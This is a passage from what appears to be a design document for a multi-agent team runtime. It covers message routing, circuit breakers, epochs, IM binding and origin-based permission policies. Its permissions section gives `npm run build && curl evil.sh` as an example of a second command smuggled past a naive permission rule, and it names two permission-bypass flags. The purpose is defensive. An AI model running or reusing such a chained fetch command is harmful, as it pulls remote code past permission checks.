  delivered, and not dropped-and-counted, but a turn that reached no model at
  all (zero tokens), leaving a message in the transcript that will never be
  answered, a wasted session build, and — because starting a turn calls
  `noteEpochTurn`, which wakes a hibernated epoch — a sealed run stamped with
  its outcome yet reading as still running, forever.

  It suppresses the drain ALONE, deliberately, rather than reusing the early
  return: a receipt someone is holding must still be settled, or the seal turns
  a person's cross-machine chat into an hours-long silence.
- `noteMemberTurnEnded` also handles a lead completing through direct app chat,
  which has no bus-owned completion promise. It schedules an end-of-tick fallback:
  an explicitly tracked bus-owned turn consumes its own pending seal only after
  its result promise settles, preserving `sealPending` even if session cleanup
  spans multiple ticks. A direct turn's fallback seals before its deferred
  mailbox drain. Both paths use the same task-completion and epoch-archive
  operation. Closed-task wakes discard remaining queued deliveries instead of
  borrowing `sealPending` when no seal will follow.
- `drainMailbox(sessionKey)` — the session layer's liveness nudge (drain #2
  above). Idempotent; a busy or reserved session is a no-op.
- `isSessionOccupied(sessionKey)` — can this session take a turn: a streaming
  turn OR a reservation whose turn has not registered yet. The bus is the only
  component that knows the second half, so this is what every status surface
  asks. Deliberately NOT `hooks.isBusy`, which is the gate's own input and must
  stay narrow enough that the gate does not consult itself.
- `assertCanContact(teamId, fromAppId, toAppId, collabMode)` — topology check;
  `free` allows all, `structured` uses `store.isEdgeAllowed` **in either
  direction**. Topology governs who may OPEN a conversation, never who may answer
  one: edges are directed and the default structured topology is a one-way star
  (`lead → member`), so a strict check forbids a member from messaging its own
  lead. That was invisible while the runtime forwarded a turn's final message
  back on its own — no rule was consulted, so every reply got through. Now that
  answering is a `team_send`, the strict check would leave a structured team
  mute: dispatch works, nothing comes back, and the member reports "the topology
  does not allow me to contact them" to nobody. Accepting the reverse edge
  restores exactly the set of channels that worked before; peer-to-peer still
  needs a peer edge.
- `getEpochStats(epochId)` / `resetEpoch(epochId)` — circuit-breaker observability
  and lifecycle reset (session layer calls `resetEpoch` on seal).
- `onBreach(cb)` — subscribe to circuit-breaker breaches (orchestration polls /
  reacts; see below).

### Turn completion union

```ts
type TurnCompletion =
  | { kind: 'result'; content: string; taskId?: string }
  | { kind: 'escalation'; content: string }
  | { kind: 'error'; message: string }
  | { kind: 'timeout' }
  | { kind: 'undelivered'; reason: string }
```

The session layer maps each turn ending to one of these. **It is a status, not a
reply** — the `content` on a `result` is never forwarded to anyone. It has two
non-teammate consumers only: a completion receipt (a person's 1:1 chat) and,
for the failing kinds, the office record. `undelivered` exists so "the wake
never reached the owner" is distinguishable from `result` with empty content
(the turn ran and said nothing) and from `timeout` (reachable but slow).

## Circuit breaker (§13.3)

Per-epoch counters centralized here, defaults from `TEAM_CIRCUIT_DEFAULTS`,
team-level overridable via `circuitOverrides`:

- `maxMessages` — total `team_send` count per epoch.
- `maxForwardDepth` — envelope chain depth (each completion-wake carries
  `forwardDepth = parent + 1`); guards A↔B ping-pong. The depth rides on
  `TeamTriggerContext` into the woken turn and back out through the `team_send`
  that turn makes (`TeamMcpContext.forwardDepth`) — a chain restarting at 0 per
  hop is a chain this limit can never see.

A person's 1:1 message charges nothing at all (see "A person is not a member").

On breach, `send()` throws `CircuitBreakerError` (the offending action is
stopped and the LLM sees the error) AND the bus invokes `onBreach` listeners.
The session-layer orchestration subscribes via `onBreach` and turns a breach
into an escalation to the user + epoch stop. The bus does not import
orchestration; it only surfaces the signal. Surfacing is therefore two-pronged:
a thrown error at the call site, and an `onBreach` event for the supervisor.

## Blackboard facade

`createBlackboard({ store, getMemberStatus? }) → Blackboard`

- `postTask({ teamId, epochId, callerAppId, title, assignee, assigneeAppId, parentId? }) → { taskId }`
- `updateTask({ teamId, epochId, taskId, status, resultRef?, note? })`
- `postFinding({ teamId, epochId, callerAppId, content?, ref? }) → { findingId }`
- `postActivity({ teamId, epochId, kind, actorAppId, subject, ... }) → { activityId }`
- `readBoard(teamId, epochId, callerAppId, filter?) → BlackboardSnapshot`

Each task/finding write emits `team:blackboard`. `getMemberStatus(appId)` is
injected (defaults to `'idle'`) because live member status lives in runtime, not
the store — keeping the blackboard decoupled from session state.

## Team MCP context

`createTeamMcpServer(context) → halo-team` with tools `team_send`,
`team_post_task`, `team_update_task`, `team_post_finding`, `team_read_board`,
`team_read_artifact`, `team_read_member` (lead only), `team_schedule`,
`team_unschedule`, `team_complete`
(`report` is the existing report_to_user, owned by the session layer — NOT here).
`team_read_board`'s snapshot carries the epoch's periodic `checks`, so the tool
that answers "what is already assigned" also answers "what is already watched".
It renders through `board-render.ts` (markdown, not JSON) and, when its history
window withholds anything, exports the rest through `archive` and points at it.

```ts
interface TeamMcpContext {
  teamId: string
  epochId: string
  callerAppId: string
  collabMode: CollabMode
  bus: MessageBus
  blackboard: Blackboard
  callerWorkDir: string
  callerTeamFolder?: TeamFolderPaths | null
  checks?: TeamChecks
  digest?: BoardDigest
  archive?: BoardArchive
}
```

`callerWorkDir` and `callerTeamFolder` are the two places a ref may be published
from. A member's come from its turn (`app-chat`: the agent's cwd, and the folder
its Team Entry names — one value, so the prompt and the gate cannot disagree);
the space coordinator's from its conversation's scope and
`runtime.teamFolders.forMember`, looked up per call like the rest of its context.

`team_send` / `team_post_task` resolve `assignee`/`to` member names → appIds and
enforce topology; unknown members and topology violations return
`isError: true` tool_results with a clear message so the LLM corrects course.

## Session integration layer

These files turn the kernel into a running feature. They sit in the same module
but depend on the session tier (`app-chat`, `report-tool`); they are the only
files here allowed to.

- `index.ts` — `createTeamRuntime({ store, session? })` constructs the bus +
  blackboard + checks + digest + archive + turn-report + orchestration and
  returns them behind `TeamRuntime` (the epoch lifecycle, `captureReport`,
  `buildPromptContext`, the member-status projections, the turn-start/turn-end
  notices, `reconcileAwaitingDecision`, `resumeFromEscalation`
  — the interface in that file is the surface, this list is not). The blackboard
  it hands out is the routed one with an act tap in front, so a member's writes
  are counted where they are made rather than where they land (`turn-report.ts`).
  The bus is built first with a
  thin hook shim that forwards to the orchestration once it exists (breaking the
  bus↔orchestration construction cycle). `session` defaults to an app-chat-backed
  `OrchestrationSessionDeps` (loaded via dynamic import so app-chat stays out of
  the static graph). Also exposes the accessor `setActiveTeamRuntime` /
  `getActiveTeamRuntime` consumed by `app-chat` (MCP injection + prompt context)
  and `report-tool` (captureReport). Bootstrap (Task 4) calls
  `setActiveTeamRuntime(createTeamRuntime({ store }))` after the team store init.
- `orchestration.ts` — implements `TeamDeliveryHooks` (`wakeTarget` starts a
  team-channel turn via `sendAppChatMessage` and resolves once it STARTS; a
  detached chain maps the turn's ending to a `TurnCompletion` and calls
  `bus.completeTurn`; `deliverMidTurn` is its other half — for a member that is
  already running there is nothing to wake, so the envelope is rendered as a
  supplement and handed to that turn, see "Reaching a member that is already
  working"). Owns `startEpoch` (wake the lead once) and `sealEpoch`
  (archive epoch, clear every member's team session, `bus.resetEpoch`, idle the
  team — tasks/findings retained for history). Subscribes `bus.onBreach` →
  escalate-to-user + seal. Provides `captureReport` (report sink), the
  `getMemberStatus` projection (working when the member's team session is
  mid-turn), and `buildPromptContext(teamId, selfAppId, epochId)` (roster +
  topology + the member's team folder for the epoch its session serves; a team
  session is per epoch, so the folder is as stable as the rest of the Entry).
  An escalation always marks the member as owing its own person an answer —
  `escalationRouting` never changes that here (see "The escalation preference is
  a prompt, not a gate"). Owns `reconcileAwaitingDecision` — what the office reads
  about a member waiting on its own person, derived rather than pushed (see "Who
  is waiting on whom is derived, not routed"). Its own wakes (escalation resume, quiescence nudge,
  periodic check, turn-end report) go out through `bus.deliverRuntimeWake`, never `wakeTarget`
  directly — the bus owns the busy gate.
- `team-prompt.ts` — `buildTeamEntry(ctx)` / `buildTeamConstraints(ctx)`, the
  Team Entry/Constraint layers (parallel to `im-prompt`). Rendered from a
  `TeamPromptContext` built by orchestration. A turn framed for an IM chat a
  member fronts also carries that chat's IM security rules (`buildImConstraints`,
  the owner roster), exactly as a digital human's own IM chat does — see "Team
  as an IM backend".

  **The Entry is frozen at session creation, so it must be byte-stable for a
  (team, member) pair.** It is part of the agent session's reuse fingerprint
  (`computeSessionInputsFingerprint`), and a prompt that changes per turn rebuilds
  the CC subprocess on every turn — aborting whichever turn is still streaming.
  That is why `TeamPromptContext` carries no per-turn field: who started the turn
  and whether the sender is blocking on the reply are rendered into the message
  body by `renderEnvelope`, not into the prompt.

  `selfIsDisposable` is the one field neither rendered nor per-turn: it reports
  that the app running this turn will NOT outlive the team (an AI-provisioned
  member of a temporary collaboration — both halves required: a digital human
  the person installed is never cleaned up by a dissolve, and outlives the
  team). `app-chat` reads it to withhold the surfaces whose only purpose is to
  outlive the work: memory (`memory.md`, the memory tool, the compaction pass —
  a record nothing would ever read) and the digital-human tools (`halo-apps`, a
  member about to be deleted creating artifacts that are not). The flag flips
  one way only, on "save as team", so a saved team's members keep both from
  their next turn — the deliberate session rebuild the fingerprint is designed
  for, not a per-turn one.
- Lead provisioning (`buildLeadSystemPrompt` + `provisionLeadSpec`) lives in the
  team data/lifecycle layer at `apps/team/lead.ts`, not here — the lead app spec
  is provisioning data the team service installs, so keeping it out of runtime
  avoids a persistence→runtime dependency. Live turn mechanics stay in
  `team-prompt.ts`.

### Report routing (§5.3)

`report-tool.ts` reads `ReportToolContext.teamContext` (a `TeamTriggerContext`).
On a team turn: a result is captured to the runtime (`captureReport(corr,
{kind:'report_result', content, taskId?})`) with NO user-facing entry; an
escalation writes a user entry tagged with `content.teamContext` (a `TeamContext`
persisted inside the `content_json` blob — no migration) AND captures
`{kind:'report_escalation'}`. Completion detection does NOT depend on this call —
the orchestration detects turn end regardless (§5.6); a captured report only
enriches the outcome.

### An open question does not suspend a member

A member that escalates ends its turn, but it is NOT parked: teammate messages
and periodic checks keep waking it, and it can hit a second wall and ask again.
So **a member may owe several answers at once**, and they come back in whatever
order the person works through them. Three consequences the code must keep:

- The tool result says exactly this. It used to promise "you will be resumed
  with the user's response", which taught a member to read the next unrelated
  wake as its answer. It also names the questions still unanswered, so a new ask
  can absorb or supersede an old one instead of piling on.
- `resumeFromEscalation` **quotes the question** it answers. Without it, an
  answer to the older of two open questions binds to the newer one.
- The user-facing decision queue is worked oldest-first (`components/team/workbench/useTaskDecisions`).
  The app record's single `pendingEscalationId` is only ever the newest and
  cannot express a queue; the activity store (`getAllPendingEscalations`) is the
  truth for "what is still open".

### Who is waiting on whom is derived, not routed

Only the owner's machine can see, or answer, its member's question — so the fact
has to travel (`team_members.awaiting_decision`, office-shared via
`member_profile`), or every other machine reads a blocked member as idle and the
office looks stopped.

It cannot be written only where the escalation is RAISED. That happens inside
`wakeTarget`'s completion, and most turns never pass through it: a member woken
by a teammate on ANOTHER machine uses the common app-chat mailbox, an IM-backed
team turn comes from `dispatch-inbound`, a person's 1:1 goes straight to the
session. All three left the member unmarked — the office saw nothing, and so did
the one screen that could have answered.

So `reconcileAwaitingDecision(appId)` recomputes it instead, from the persisted
escalation (`hasPendingEscalation`), on the machine that owns the member. It is
idempotent — an unchanged answer writes, publishes and announces nothing — which
is what lets it run at every team turn end (`app-chat`, the one point every path
converges on), when an answer is recorded, and at startup for every locally
owned member, so a restart re-converges. Consuming `capturedEscalations` outside
`wakeTarget` would have been the shorter route and is wrong: `sendAppChatMessage`
resolves BEFORE that completion handler, so a second consumer steals the entry
and hands the waiting teammate a plain `result` where an escalation happened.

There is deliberately NO exclusion here — every pending escalation counts, lead or
not, whatever the team's escalation preference. An earlier version excluded a
non-lead's question under `'lead'` routing, which put two opposite answers in the
codebase for one question: the persisted mark said "not waiting" while the live
projection (`getMemberStatus` → `hasPendingEscalation`) and the pending-decision
list the banner reads (`pendingEscalationsForTeam`) both said "waiting". The
office showed idle, the owner's own screen showed a decision it could not clear.
One question, one answer: if the record holds an unanswered escalation for this
member, its person owes an answer.

### The escalation preference is a prompt, not a gate

`escalationRouting` shapes what a member is TOLD (`team-prompt.ts`): under
`'lead'`, take blockers to the lead first and reserve `report(type:"escalation")`
for what the lead cannot settle. It does not intercept the call.

It used to. A non-lead's escalation under `'lead'` was redirected into the lead's
mailbox and the user-facing emission suppressed — and the result was worse than
either design on its own: the banner still lit (the audit entry feeds the same
pending-decision list), so the lead AND the person were both answering, while the
member had been told "routed to the lead, end your turn" and was waiting for
neither. Nothing carried the person's answer back to it.

The rule now: a member that asks for a person reaches that person. Which door to
try first is a judgment, so it is stated in the prompt and left to the model —
the same treatment `collabMode` gets. The cost is that a member inclined to ask
humans will ask more often; that is a prompt to tune, not a call to intercept.

## Triggers & entries — a team is triggerable like a digital human

A team is a first-class triggerable entity: every way a single digital human can
be invoked, a team can too. Two execution modes mirror the digital-human dual
path (§3.5):

- **Triggered run** (stateless ingress): `schedule` / `http` / `webhook` /
  `file`. Each trigger opens a fresh `'run'` epoch (`startEpoch`), wakes the lead
  once, and auto-seals on quiescence. Wiring lives in `team-triggers.ts`
  (`createTeamTriggerScheduler`): `schedule` triggers become `kind='team'`
  scheduler jobs; `webhook`/`file`/`wecom` triggers become EventRouter
  subscriptions via the shared `sourceConfigToEventFilter` mapping
  (`apps/runtime/event-filter-mapping.ts`, also used by the app runtime). Both
  paths converge on the injected `runTeam`, guarded so triggers never overlap a
  live run — see below.
- **Conversation** (message-driven ingress): user UI / IM. Each inbound message
  resumes the lead's session inside a long-lived `'conversation'` epoch scoped
  **per chat** (`orchestration.ensureConversationEpoch(teamId, chatKey)` —
  get-or-create by `(teamId, chatKey)`). One epoch per chat means 1:1 chats are
  per-person and group chats are per-group, matching how a single digital human
  keys IM sessions by `chatId`. Conversation epochs do NOT occupy
  `team.currentEpochId` (that pointer is for the single run epoch), so many chats
  — and a concurrent scheduled run — coexist without collision. They are never
  auto-sealed on quiescence (going quiet after a reply is the normal "awaiting
  next message" state); a single chat is sealed by `sealConversationEpoch` on
  `/clear` with terminal reason `cleared` (the next inbound message opens a new
  context), and all end on dissolve. The mode is persisted on
  `team_epochs.lifecycle` (`'run' | 'conversation'`, v3) and the chat scope on
  `team_epochs.chat_key` (v4); `getCurrentEpochForTeam` is filtered to run epochs
  so open conversation epochs never shadow it.

### A run is live because a process is running it

The reentrancy guard asks the runtime's in-memory run slot
(`TeamRuntime.activeRunEpochId`), never `team.currentEpochId`. The pointer is a
projection of that slot for the UI and for joiners, and it outlives the process
that wrote it. Guarding on it made one crash mid-run permanent: the epoch stayed
open for good, every later trigger read "already running" and skipped silently,
and the team never ran again — while still answering in conversations, which do
not occupy the slot, so nothing looked wrong. The pointer is still written on
start and cleared on seal; it is simply no longer what a trigger believes. A
joined office is the exception and keeps reading it, because there the run really
is happening on another node.

`recoverInterruptedRuns()` runs once at bootstrap, before triggers are
rehydrated: every open run epoch on a hosted office is sealed as interrupted
(`error`, the reason the History tab labels "Interrupted") and the slot is
released. That is not killing work — the sessions died with the process that
owned them — it is recording when the work stopped, so the next trigger starts a
run instead of being refused by a ghost. The epoch keeps the record it already
had: a run that stamped its summary and outcome had finished and was merely
revived (a message re-opens its context), and re-classifying that would rewrite
history.

### Team as an IM backend

An IM channel instance (`ImChannelInstanceConfig`) names **one member of one
team** as the chat's front desk: `teamId` plus `appId` = that member. The lead is
not privileged here — any member can be bound, which is the point: a specialist
gets its own bot, and the person reaches it without going through the counter.
`dispatch-inbound.ts` ensures the conversation epoch for this chat (`chatKey =
${instanceId}:${chatType}:${chatId}`) and calls `sendAppChatMessage` with BOTH
`imSession` (reply path, file send) AND `teamContext` (team tools + Entry).
`app-chat` composes the team Entry with `buildTeamImBridge`, whose framing splits
on `selfIsLead`: the lead is the team's counter and routes work, a teammate was
reached in its own right and answers its own remit first. Either way the message
is from a real person and that member's final message goes back to the chat. The
chat's owner/guest rules apply exactly as in a digital human's own IM chat (see
below). Provider-agnostic: any IM brand works, since the binding lives in the
generic config + dispatch path.

**The binding names a member, not a role.** Promoting a different lead does not
re-point an existing channel. `dispatch-inbound.ts` is the trust boundary for it
(config.json is user-editable and a roster changes after binding): a message is
dropped unless the bound app is still a member of that team AND is locally owned
(`isRemoteMember` false). A federated member's app is not installed on this
machine, so nothing here could run it — the picker offers only `localMembers`
(`TeamListItem`) for the same reason.

**Owners and guests are the channel's, exactly as for a digital human.** Who is
an owner is answered per message by `dispatch-inbound` from the channel's
permission control — the same three cases, the same owner auto-claim and
no-owner gate. The answer travels with the message to `app-chat`
(`AppChatRequest.imPermission`) and is also kept as the chat's last sender under
the member's team session key, for the woken turns below. Because the person's
own message is decided by the channel's rules alone, its two halves must agree:
a message stamped as coming from outside whose standing reads as an owner (or is
missing) is refused, with a log, rather than run under whichever half is wrong.
From there it is the one guest path, not a second one:
`app-chat` holds a guest to the channel's guest policy through
`applyCapabilityPolicy`, the per-call gate and the turn's file boundary, and the
prompt carries the same IM security rules. The team's own coordination servers
stay mounted for a guest (they are how the member reaches its team, not a
capability lent to the caller), with one exception: a guest is not handed
`team_schedule` / `team_unschedule` (`TeamMcpContext.servesGuest`). A periodic
check is a standing instruction that keeps spending the owner's model allowance
long after the guest has gone, and a guest of a digital human's own chat has no
such tool either. What decides how far a guest's request may go from there is
its origin.

- **A guest's message is stamped a guest's** (`origin: 'guest'`). The IM
  channel is where it crosses into this node, and nobody here vouched for the
  sender. Without the stamp the restriction would end at the front desk: asking
  it to have a teammate do the work would hand the request to a member running
  with the owner's own reach. With it, whatever a turn held to that guest sends
  — its `team_send`s, a check it sets, a question it asks — carries the guest's
  origin, and a member it reaches is held to its own delegated policy read
  strictly AND capped by this chat's current guest settings (`intersectPolicies`,
  the chat named by the conversation's `chatKey`, read from the same channel
  config the front desk reads). No setting made for colleagues ever widens what a
  stranger can reach, and a guest's request never takes the "grants everything"
  shortcut. A guest's request never leaves its chat's conversation, so one that
  arrives from another machine has no chat here and is lent nothing but the
  team's own tools.
- **A turn woken in the chat keeps the standing of whoever it serves.** It has
  no sender of its own, so it reads the chat's last sender — once, as it begins,
  while its hold on the session keeps any newer message from replacing it. While
  that names a guest it runs under that guest's policy — the same tool set as
  the guest's own turn, so the session is not rebuilt between them — and what it
  hands on, and its own ending, are the guest's, whatever woke it. Otherwise the
  wake's own origin decides: a teammate's reply in the guest's chain carries the
  guest's origin (its turn served the guest), so it is held strictly even when
  the chat can no longer name the sender (the permission context lives in
  memory, so a restart clears it) or an owner spoke last. A wake with no origin
  is the owner's own work and is unchanged. So is the person's own message,
  which only the channel's rules decide.
- **The session is shared with the owner's own Halo window.** Only turns framed
  for the chat (`imSession`) answer to a chat sender; the owner typing into the
  same session from Halo is never taken for the chat's last guest.

One consequence reaches past guests: a teammate on another machine whose
message wakes the front desk is held to the member's delegated policy, as it is
for every other member.

The **reply** side has the same question and must answer it identically:
`resolveImRoute` decides whether a later, woken turn pushes back to the chat. It
reads the IM instance's own binding rather than the team's lead, so exactly one
member fronts a chat, and a re-pointed binding cannot leak the previous member's
woken reply into it.

**Both routes into that chat must resolve it in FULL or not at all** — framing
(`imSession`) *and* capability (`imFileSend`, via
`im-channels/file-send-resolve`). This is not tidiness. The two routes share one
session key, and an agent session is rebuilt whenever its tool set changes; a
rebuild landing inside a turn's start-up settles that turn's round as failed
(`session-consumer`'s `onConsumerStopped` drains the sink queue, and the sink
outlives the session). Resolving the framing without the capability therefore
did not merely disable a tool — every woken front-desk turn destroyed itself
before it could push, the person in the chat waited forever, and the model still
produced the answer on a session whose caller had already given up. Nothing
about that is visible from the chat, so the invariant is pinned by a test rather
than left to review.

Underneath it sits a race that outlives this fix: ANY legitimate rebuild
mid-start-up (a model change, an MCP toggle) can settle the starting turn the
same way. Removing the needless rebuild removes this trigger, not the race.

**A woken turn holds the chat from the moment the bus decides it.** A wake first
waits for a team concurrency slot (`runGatedTurn`), and the bus's reservation is
invisible to `dispatch-inbound`. Read as idle in that wait, the chat let an IM
message start a turn of its own, and the wake started a second one on the same
session once its slot freed. So `runGatedTurn` takes the session's hold
(`OrchestrationSessionDeps.holdTurn` → `beginAppChatTurnStart`) before awaiting
the slot and passes it to the turn (`turnStart`), which adopts it; a wake that
never reaches `app-chat` gives it back. A message arriving meanwhile is buffered
and answered right after. A stop reaches the waiting wake like any message on its
way: once it has its slot it ends as undelivered ("Stopped before it could run")
without setting up a session, so the chat is free again at once. A remote member
is not held here — its owner holds it when the wake lands. The hold, rather than teaching the busy predicate the bus's reservation:
that predicate is the leaf `app-chat-live-turn`, and the bus asks it
(`isBusy`), so the edge back would be both an import cycle and a recursion. One
bound to know: a wake that times out while still queued keeps its hold until it
reaches a slot and bails, so the chat's messages wait — buffered, not lost —
until then.

**IM front-desk turns follow the same permission rule.** A teammate message may
join an owner-authorized IM turn. A guest-authorized turn receives only messages
with exactly that guest policy; owner or external messages wait as a separate
merged turn. The turn's entry path never decides delivery timing.


This is the one place a final message is delivered without an explicit send,
because the IM reply handle belongs to this turn. A teammate's answer can now
join that turn when permissions match; the prompt no longer promises that it
must arrive in a later turn. The member still addresses the person directly and
keeps internal coordination out of its final answer.

## Conversations & run outcomes (office-shared session model)

Epochs — runs AND conversations — are **office-shared objects** with the office
authority as the single writer, so every node sees the same session list and the
same history (mirrors the blackboard replication plane; no new protocol).

- `orchestration.ensureConversationEpoch(teamId, chatKey, title?)` get-or-creates
  a per-chat `'conversation'` epoch; `renameConversationEpoch` relabels it. Both
  fire `onEpochMutation(epoch)` — the replication capture wired by bootstrap to
  `federationManager.routeEpochWrite`, which captures into the authority's log
  (hosted) or routes a `blackboard-write { op:'epoch_upsert' }` to the host
  (joined). Replicas apply via `store.upsertEpoch` (idempotent whole-row, later
  write wins). `sealEpoch`/`noteEpochTurn`/`startEpoch` publish the same way, so
  conversation state and run history converge office-wide (P0-1, spec AC-S1).
- **`noteEpochTurn(teamId, epochId)`** is the single "a turn is entering this
  epoch" entry (app-chat calls it for every team turn, `sendToMember` for a human
  1:1): it stamps `last_activity_at` and, reversible-seal, wakes a hibernated
  epoch. Recency is stamped rather than derived because a conversation lives for
  weeks — ordering a work list by creation buries the thread used five minutes
  ago. The stamp is monotonic (`MAX`), so a replicated row that predates a local
  turn cannot pull it backwards.
- **Chat-key namespaces** (`shared/apps/im-keys`): `native:{uuid}` (a user "New
  session" from the Conversations tab), `direct:{appId}` (a 1:1 member thread),
  and `{instanceId}:{chatType}:{chatId}` (an IM chat). `apps/team/epoch-label.ts`
  is the SSOT that classifies a chatKey and resolves its human label (main-side;
  the renderer performs zero translation).
- **Naming — every "thing" is readable, auto-generated** (parity with the space
  chat, which titles a conversation from its first message):
  - a native conversation is auto-named from the person's first message via
    `orchestration.maybeAutoNameConversation` (→ `deriveConversationTitle`, ≤48
    chars, whitespace-collapsed), captured + replicated like a rename — so no node
    is left showing "New session". A teammate-driven turn never names it: the
    caller passes `fromHuman` (no trigger kind, or `kind: 'human_message'`), and
    the epoch must still be an untitled NATIVE conversation.
  - a member / IM conversation labels by the member / chat name (no title needed).
  - a RUN is an event instance, not a named object: history identifies it by
    time · trigger · outcome + the AI seal `summary`; the live Floor switcher —
    where at most ONE run exists — labels it with the **team name** (its standing
    purpose), never a fake "today's run".
- **Run outcome** (`EpochOutcome`, spec P0-4) is classified at seal by
  `classifyRunOutcome`: `failed` (error/timeout) > `escalation` (a decision still
  waiting) > `output` (a produced ref) > `no_action`. Stamped on the epoch row and
  replicated, it drives the History tab's badges + grouping.
- **Member busy projection** (`getMemberBusy`, spec P0-2): every OPEN epoch a
  member is actively serving, each with a human label — stamped into the roster
  (`RosterMember.busy`) and the federation snapshot so a board can truthfully say
  "busy with another conversation". `getMemberStatus` lights a member `working`
  for a run OR a conversation, and keeps it `waiting_user` after a run seal while
  a persisted escalation is unanswered (P0-5; `hasPendingEscalation` is the
  activity-store truth, the in-memory waiter set is only the live-window mirror).
  "Serving" is `bus.isSessionOccupied`, not the session probe — see "A stuck slot
  must be recoverable, and must never read as idle".

The service (`apps/team`) exposes `listConversations` / `openConversation` /
`renameConversation` / `archiveConversation` and folds `pendingEscalations` into
`TeamDetail` (the cross-tab attention banner, C2). IPC/HTTP mirror these.

## Team identity: duty and delegated capabilities

Two facts about a member are per-TEAM and owner-authored, and they live on the
`team_members` row (see `apps/team/DESIGN.md`):

- **duty** — what it is responsible for here. Layered on top of the digital
  human's own persona, never replacing it, and applied only inside team turns:
  `buildPromptContext` puts the member's own duty in the Entry and every
  teammate's duty in the roster, in full (deciding who to hand work to is exactly
  what the text is for).
- **delegated policy** — what someone from OUTSIDE the owner's machine may make
  it do. Enforced in `app-chat` on the owner's machine, for every turn whose own
  trigger carries an origin (`isBorrowedTeamTurn`). The question is deliberately
  WHO, not human-vs-model: a colleague reaching in by hand does the same damage
  as their digital human doing it, so a cross-machine 1:1 from another person is
  held to it exactly like a teammate's `team_send` from that machine. The owner,
  their own digital humans on this machine and the runtime waking one of them
  are not held to it at all. The person in an IM chat a member fronts is held to
  that chat's owner/guest rules instead (see "Team as an IM backend"). The
  team's own coordination servers (`halo-team`, `halo-report`,
  `halo-person-context`) are never withheld — they are the channel the turn
  arrived on, not a capability lent.

### Where a request came from

Every team turn answers one question from its OWN trigger, never from what the
session did before (`TeamTriggerContext.origin`):

- **the owner's own** (no origin) — the owner, their digital humans on this
  machine working for each other, and every wake the runtime authors here (a
  lead's sweep, a check set in an unrestricted turn, a quiescence nudge, a run
  start, a turn-end notice of the owner's or a colleague's work). No delegation
  at all: the owner's options, no gate, no record, and the owner's identity for
  live delivery — so these messages join the owner's running turn.
- **a colleague's** (`'colleague'`) — a request that entered this machine from
  another one: an inbound office wake, a person's 1:1 through the
  office-credential endpoint, and the checks and questions of a restricted turn
  serving one. Read against the member's delegated policy
  (`colleagueReach`): never saved, or saved granting everything
  (`grantsEverything` — every switch on, commands unrestricted, every skill and
  installed MCP server this machine has), is FULL reach — the owner's options,
  never Operate Halo (it is offered on no settings screen and its credential
  governs all of Halo) — but still a turn of its own (identity `'colleague'`,
  never joining the owner's running turn) and still recorded. Anything else is
  read strictly, exactly as before.
- **a guest's** (`'guest'`) — a guest of an IM chat a member fronts, and
  everything a restricted turn serving that guest sets in motion. Read strictly
  and capped by that chat's guest settings; never the "everything" shortcut.

A restricted turn is told so with its request, in one notice just before the
request in its input, after any context the input opens with (`team-prompt`
`buildRestrictionNotice`, listing what is off from what the turn actually lost —
`capability-policy` `describeWithheld`): whose request it is, that this is the
owner's "What others can ask it to do" setting and not a fault, and to tell the
requester what is off rather than guess at causes. Per
turn, so it never enters the system prompt; an unrestricted turn gets nothing
and computes nothing.

**Where it is written.** Stamped only where a request crosses into this node —
an inbound office wake (`withExternalOrigin`, beside the space correction, and
for the same reason: the sender authored every field on the frame), the
office-credential 1:1 endpoint (`apps/team` `sendToMember`, where the
credential's presence is what separates a colleague from the owner's own remote
access), and a guest's message in an IM chat a member fronts
(`dispatch-inbound`). A value arriving on the wire is the sender's claim: it is
honored only where it narrows (a guest's), and otherwise replaced by
`'colleague'`. A build from before origins had kinds sends no origin but marks
outside work `external` — a teammate's request and a guest's alike, and much of
what its members send after serving one. That mark is read by the piece of work
the frame names, as such records are (below), so a mixed-version office's
teammates stay colleagues. One arriving kind is not a request: a turn-end
notice, which only the lead is ever sent, is rendered here from the facts it
carries and wakes the lead as the owner's own (or a guest's, if it says so); one
without readable facts, or addressed to any other member, is handled as any
other message from that machine. Rows that replicate in and later wake a member
here — periodic checks — follow the same rule (`checks.ts`). An origin such a
row names that this build does not know, or a code a later build left in the
check's column (`apps/team` store), is kept as the strictest the column holds —
the code pre-kinds records carry, read as they are (below) — never as the
owner's own.

**How far it travels.** Only on what a RESTRICTED turn itself sets in motion:
the checks it sets (persisted with the row) and the questions it asks
(persisted with the escalation, restored by `resumeFromEscalation`) — a
standing instruction and an answered question are still that request — and,
for a guest's request only, its `team_send`s (`TeamMcpContext.origin` →
`SendInput.origin` → the next trigger). Without that, routing a stranger's
request through one of the owner's own members would launder it into a local
one. A colleague's request stops at the member it reached: what that member
asks another of the owner's digital humans is the owner's own work, which no
choice made for colleagues limits (`team-tools` send). A turn with full reach
hands nothing on. Nothing else carries it — no other runtime wake, no session
memory: when the turn that served a request is over, the member is the owner's
again. The one exception is a guest's: a notice reporting what a guest's
request produced wakes the lead as the guest's, for that one wake.

**What it does not cover — a trade the owner accepted.** The origin restricts
only the turn a request from outside directly drives, and what that restricted
turn sets in motion as described above. So a colleague can have one of the
owner's digital humans ask another for work, and that work runs with the
owner's reach and stays off the owner's record; and what a full-reach turn sets
in motion runs as the owner's own — Operate Halo included, where the member it
reaches has it switched on, though the colleague's own turn never gets it.
What the owner's own turns READ that came from elsewhere — a colleague's result
in a turn-end notice, the board, findings, published artifacts — is weighed by
a digital human running with the owner's reach, at its own judgment. A turn
session's tool servers and hooks are fixed when the session is built, so a turn
of another standing gets a session of its own: the team server is marked with
the origin it stamps, and a session that records calls is built with that
context (`app-chat`).

Records written before origins had kinds carried `external: true` for any
outside origin, and such builds still send that mark (above). A guest's request
never leaves its chat's conversation, so such a record or frame in an IM chat's
conversation — or in one that cannot be found — is read as a guest's and any
other as a colleague's (`legacyExternalOrigin`) — never as the owner's own.

### The three layers, and why none of them holds alone

`applyCapabilityPolicy` is the single place a policy becomes engine options:

1. `disallowedTools` removes withheld built-ins from the model's pool — no
   refusal to argue with.
2. MCP injection decides the rest: a server not injected does not exist.
3. `allowedTools` lists what runs without asking. This is the layer command
   rules ride on. Everything else reaches the per-call gate
   (`delegation-gate.ts`), which refuses.

Command rules are Claude Code's own permission syntax (`Bash(npm run:*)`) and
are handed to the engine verbatim, because the engine splits a compound command
on every shell separator and requires each part to match. A rule test written
here would clear `npm run build && curl evil.sh`.

Four consequences worth stating, because each was a hole:

- **Both bypasses must go.** `permissionMode: 'bypassPermissions'` and the
  `dangerously-skip-permissions` flag each skip the permission engine on their
  own, and the permission engine is what evaluates the command rules.
- **The gate is per call, the options are per session.** A session outlives its
  turn and its driver can change, so the gate reads what the current turn
  registered rather than what the session was built with. Every turn on a gated
